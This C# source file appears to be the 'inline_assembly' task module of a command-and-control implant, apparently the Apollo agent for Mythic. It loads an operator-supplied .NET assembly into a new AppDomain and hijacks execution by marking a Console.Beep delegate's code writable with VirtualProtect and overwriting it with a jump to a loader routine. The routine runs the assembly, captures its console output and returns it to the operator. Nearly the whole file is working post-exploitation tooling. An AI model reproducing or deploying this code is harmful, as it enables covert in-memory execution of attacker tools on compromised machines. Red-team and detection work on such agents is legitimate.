#define COMMAND_NAME_UPPER

#if DEBUG
#define INLINE_ASSEMBLY
#endif

#if INLINE_ASSEMBLY

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using ApolloInterop.Serializers;
using System.Threading;
using System.IO;
using System.Collections.Concurrent;
using System.IO.Pipes;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Classes.Core;
using ApolloInterop.Classes.Collections;
using ApolloInterop.Utils;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Runtime.CompilerServices;

namespace Tasks
{
    public class inline_assembly : Tasking
    {
        [DataContract]
        internal struct InlineAssemblyParameters
        {
            [DataMember(Name = "pipe_name")]
            public string PipeName;
            [DataMember(Name = "assembly_name")]
            public string AssemblyName;
            [DataMember(Name = "assembly_arguments")]
            public string AssemblyArguments;
            [DataMember(Name = "loader_stub_id")]
            public string LoaderStubId;
        }

        [DllImport("kernel32")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private JsonSerializer _serializer = new JsonSerializer();
        private AutoResetEvent _complete = new AutoResetEvent(false);
        private Action<object> _sendAction;

        private Action<object> _flushMessages;
        private ThreadSafeList<string> _assemblyOutput = new ThreadSafeList<string>();


        private bool _completed = false;
        public string[] SplitCommandLine(string commandLine)
        {
            bool inQuotes = false;

            string cmdline = commandLine.Trim();
            List<string> cmds = new List<string>();
            string curCmd = "";
            for (int i = 0; i < cmdline.Length; i++)
            {
                char c = cmdline[i];
                if (c == '\"' || c == '\'')
                    inQuotes = !inQuotes;
                if (!inQuotes && c == ' ')
                {
                    cmds.Add(curCmd);
                    curCmd = "";
                }
                else
                {
                    curCmd += c;
                }
            }
            if (!string.IsNullOrEmpty(curCmd))
                cmds.Add(curCmd);
            string[] results = cmds.ToArray();
            for (int i = 0; i < results.Length; i++)
            {
                if (results[i].Length > 2)
                {
                    if (results[i][0] == '\"' && results[i][results[i].Length - 1] == '\"')
                        results[i] = results[i].Substring(1, results[i].Length - 2);
                    else if (results[i][0] == '\'' && results[i][results[i].Length - 1] == '\'')
                        results[i] = results[i].Substring(1, results[i].Length - 1);
                }
            }
            return results;
        }
        public inline_assembly(IAgent agent, Task task) : base(agent, task)
        {
        }

        public static string loadAppDomainModule(String[] sParams, Byte[] bMod)
        {
            string result = "";
            var bytes = bMod;
            AppDomain isolationDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
            isolationDomain.SetData("str", sParams);
            bool default_domain = AppDomain.CurrentDomain.IsDefaultAppDomain();
            try
            {
                isolationDomain.Load(bMod);
            }
            catch { }
            var Sleeve = new CrossAppDomainDelegate(Console.Beep);
            var Ace = new CrossAppDomainDelegate(ActivateLoader);

            RuntimeHelpers.PrepareDelegate(Sleeve);
            RuntimeHelpers.PrepareDelegate(Ace);


            var flags = BindingFlags.Instance | BindingFlags.NonPublic;
            var codeSleeve = (IntPtr)Sleeve.GetType().GetField("_methodPtrAux", flags).GetValue(Sleeve);
            var codeAce = (IntPtr)Ace.GetType().GetField("_methodPtrAux", flags).GetValue(Ace);

            int[] patch = new int[3];

            patch[0] = 10;
            patch[1] = 11;
            patch[2] = 12;

            uint oldprotect = 0;
            VirtualProtect(codeSleeve, new UIntPtr((uint)patch[2]), 0x4, out oldprotect);
            Marshal.WriteByte(codeSleeve, 0x48);
            Marshal.WriteByte(IntPtr.Add(codeSleeve, 1), 0xb8);
            Marshal.WriteIntPtr(IntPtr.Add(codeSleeve, 2), codeAce);
            Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[0]), 0xff);
            Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[1]), 0xe0);
            VirtualProtect(codeSleeve, new UIntPtr((uint)patch[2]), oldprotect, out oldprotect);
            try
            {
                isolationDomain.DoCallBack(Sleeve);
            }
            catch (Exception ex)
            {
            }
            string str = isolationDomain.GetData("str") as string;
            result = str;
            unloadAppDomain(isolationDomain);
            return result;
        }

        static void ActivateLoader()
        {
            string[] str = AppDomain.CurrentDomain.GetData("str") as string[];
            string output = "";
            foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
            {
                if (!asm.FullName.Contains("mscor"))
                {
                    TextWriter realStdOut = Console.Out;
                    TextWriter realStdErr = Console.Error;
                    TextWriter stdOutWriter = new StringWriter();
                    TextWriter stdErrWriter = new StringWriter();
                    Console.SetOut(stdOutWriter);
                    Console.SetError(stdErrWriter);
                    var result = asm.EntryPoint.Invoke(null, new object[] { str });

                    Console.Out.Flush();
                    Console.Error.Flush();
                    Console.SetOut(realStdOut);
                    Console.SetError(realStdErr);

                    output = stdOutWriter.ToString();
                    output += stdErrWriter.ToString();
                }
            }
            AppDomain.CurrentDomain.SetData("str", output);

        }

        public static void unloadAppDomain(AppDomain oDomain)
        {
            AppDomain.Unload(oDomain);
        }

        public override void Kill()
        {
            _completed = true;
            _cancellationToken.Cancel();
            _complete.Set();
        }

        public override System.Threading.Tasks.Task CreateTasking()
        {
            return new System.Threading.Tasks.Task(() =>
            {
                TaskResponse resp;
                Process proc = null;
                try
                {
                    InlineAssemblyParameters parameters = _jsonSerializer.Deserialize<InlineAssemblyParameters>(_data.Parameters);
                    if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
                        string.IsNullOrEmpty(parameters.AssemblyName))
                    {
                        resp = CreateTaskResponse(
                            $"One or more required arguments was not provided.",
                            true,
                            "error");
                    }
                    else
                    {
                        if (_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
                        {
                            if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exeAsmPic))
                            {
                                byte[] ByteData = assemblyBytes;
                                string[] StringData = SplitCommandLine(parameters.AssemblyArguments);

                                string output = "";
                                output = loadAppDomainModule(StringData, ByteData);
                                if (!string.IsNullOrEmpty(output))
                                {
                                    _agent.GetTaskManager().AddTaskResponseToQueue(
                                        CreateTaskResponse(
                                            output,
                                            true,
                                            ""));
                                }
                            }
                            else
                            {
                                resp = CreateTaskResponse(
                                    $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
                                    true,
                                    "error");
                            }
                        }
                        else
                        {
                            resp = CreateTaskResponse($"{parameters.AssemblyName} is not loaded (have you registered it?)", true);
                        }
                    }
                }
                catch (Exception ex)
                {
                    resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
                }
            }, _cancellationToken.Token);
        }

        private void Client_Disconnect(object sender, NamedPipeMessageArgs e)
        {
            e.Pipe.Close();
            _completed = true;
            _cancellationToken.Cancel();
            _complete.Set();
        }

        private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
        {
            System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe, _cancellationToken.Token);
            System.Threading.Tasks.Task.Factory.StartNew(_flushMessages, _cancellationToken.Token);
        }

        public void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            // Potentially delete this since theoretically the sender Task does everything
            if (pipe.IsConnected && !_cancellationToken.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] data))
            {
                pipe.EndWrite(result);
                pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
            }
        }

        private void Client_MessageReceived(object sender, NamedPipeMessageArgs e)
        {
            IPCData d = e.Data;
            string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
            _assemblyOutput.Add(msg);
        }
    }
}
#endif